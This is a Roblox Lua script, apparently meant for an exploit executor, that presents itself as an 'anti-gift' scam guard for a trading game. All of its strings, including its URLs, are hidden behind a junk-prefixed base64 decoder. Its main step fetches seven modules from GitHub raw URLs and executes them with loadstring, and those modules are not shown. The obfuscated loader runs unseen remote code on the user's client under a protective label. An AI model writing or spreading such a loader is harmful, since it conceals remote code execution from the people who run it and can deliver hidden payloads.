local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function SNokTKdHGSkP(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


-- Main.lua - Next-Gen Anti-Gift Loader via loadstring
local function LoadModule(url)
    local success, result = pcall(function()
        return loadstring(game:HttpGetAsync(url))()
    end)
    if success then
        return result
    else
        warn(SNokTKdHGSkP('ThAqsrcoEVLdvEcEIliMmwJAVbZJRGsgsTTPSLbSQUqgrCpesTbHQSkRmFpbGVkIHRvIGxvYWQgbW9kdWxlIGZyb20gVVJMOiA=')..url)
        return nil
    end
end

-- GitHub Raw URLs for each module
local GUIManager = LoadModule(SNokTKdHGSkP('mZPKGsHnNUdKDOMhGxLbIBuFgBTdrbWOHWlSbuFcNNOGjwjgnYsfyXAaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9yZWZzL2hlYWRzL21haW4vR1VJTWFuYWdlci5sdWE='))
local RemoteGuard = LoadModule(SNokTKdHGSkP('QyFeGknjmRtIihPHfafAfdmpiktwzwCHXtKLMpAYmCZpRsONkQoMhLHaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9yZWZzL2hlYWRzL21haW4vUmVtb3RlR3VhcmQubHVh'))
local InventoryLock = LoadModule(SNokTKdHGSkP('dAbtKkVglzKmqnxqFucbZLDvwtjBZZXNYVTCmUHffXGBfLSWYIIeShoaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9yZWZzL2hlYWRzL21haW4vSW52ZW50b3J5TG9jay5sdWE='))
local TamperProtection = LoadModule(SNokTKdHGSkP('SyDDWolMrcADdGJJgZAWuCutVMDvQzTksBdZlvFdyIacsHWaGfgexmTaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9yZWZzL2hlYWRzL21haW4vVGFtcGVyUHJvdGVjdGlvbi5sdWE='))
local Logger = LoadModule(SNokTKdHGSkP('hHVIuGQyWeLYAfeFhdeXvTfDendhiXAAaKMWimRRuSOHyFqPLYHyJMsaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9yZWZzL2hlYWRzL21haW4vTG9nZ2VyLmx1YQ=='))
local Config = LoadModule(SNokTKdHGSkP('jOWsJOFpyljyTfFCzyFhpuCPMdHdeZClaskEzNigbIGYVIQuUNqcDNdaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9yZWZzL2hlYWRzL21haW4vQ29uZmlnLmx1YQ=='))
local Utils = LoadModule(SNokTKdHGSkP('IgKAodByraUMSCYQqNsVomvRGsWItbPCxUhyZnhBxPkPidVrZazAqJqaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RlZXBzLXgvR0FHLVNDQU1HVUFSRC9yZWZzL2hlYWRzL21haW4vVXRpbHMubHVh'))

-- Services
local Players = game:GetService(SNokTKdHGSkP('jWNiQuKuOhdmJYwYbaQsKRanNTmwRkWqZUXHumWRUeZxiWWMOWFoLjTUGxheWVycw=='))
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService(SNokTKdHGSkP('nTQmlEvMwVcxgLKuQrOoIjIxcgCnheUkoWJtKAjanDeNbbwAqdmmQruUnVuU2VydmljZQ=='))

-- Initialize GUI
GUIManager:Initialize()
GUIManager:SetStatus(SNokTKdHGSkP('SCTWBkCtGkLnbyRsMBSRDXvkpArKlzbjkHDBTsncSeVKKRJaITEgTqpc2FmZQ=='))

-- Show Loading Screen
GUIManager:ShowLoadingScreen(Config.LoadingTime or 15)

-- Block Gift Remotes
RemoteGuard:ScanAndBlock()

-- Lock Inventory
InventoryLock:LockInventory()

-- Start Tamper Protection
TamperProtection:Start()

-- Start Dynamic Monitoring
RemoteGuard:MonitorNewRemotes()
RunService.Heartbeat:Connect(function()
    InventoryLock:LockInventory()
end)

-- Initialize Logger
Logger:Initialize()
Logger:AddEntry(SNokTKdHGSkP('ELOBgCPLBIwtsdOfCyngYRImGKRNDEOPlLsUkvSUMessOXWCxjumfHTQW50aS1HaWZ0IHN5c3RlbSBpbml0aWFsaXplZCBzdWNjZXNzZnVsbHku'), SNokTKdHGSkP('xcsAXYcgkjdQYjtaifpmRCcuQuppJecyiQLYTdXbrGBtezmQrHCWnwnaW5mbw=='))

-- Update GUI Status
spawn(function()
    while true do
        local status = RemoteGuard:GetStatus()
        GUIManager:SetStatus(status)
        task.wait(Config.StatusUpdateInterval or 5)
    end
end)

-- Optional Auto-Kick
RemoteGuard.OnRemoteTriggered:Connect(function(remoteName)
    Logger:AddEntry(SNokTKdHGSkP('GRuXZhEYATjmqSgAYLXBghVDPtoXPTizMzeWpREdRPNoPeysQsYbfnmUmVtb3RlIHRyaWdnZXJlZDog')..remoteName, SNokTKdHGSkP('paYTKUXLbWfXePZrUrDmrNMGaQLxXdvOGWiHAHzFYUQreZSyeNyXsFlYWxlcnQ='))
    GUIManager:SetStatus(SNokTKdHGSkP('iwtbhXLPrlyhibpkbySSLCxARgydCIEwljGeCISwUEpzneDmUMdnXDMYnlwYXNz'))
    InventoryLock:LockInventory()
    if Config.AutoKick then
        LocalPlayer:Kick(SNokTKdHGSkP('nOdcSOdaucGNAfGLrChmfZCUwOGSadQCpmXPooxaqhfthenQseTRAkR8J+aqCBBbnRpLVNjYW06IEdpZnQgcmVtb3RlIHRyaWdnZXJlZC4gUGV0cy9pdGVtcyBsb2NrZWQu'))
    end
end)

Logger:AddEntry(SNokTKdHGSkP('UuGbQJjnueBKmxfFjUKAHTlPReMaZXHFvNjAZrqcQMrMiAKeWKcSdIJTmV4dC1HZW4gQW50aS1HaWZ0IGZ1bGx5IHJ1bm5pbmcu'), SNokTKdHGSkP('HYWBQDlpYkyfQvxqgvSklcDefkBPMaOFHVdgiJwBgfliyTdpOTkxRTDaW5mbw=='))
    
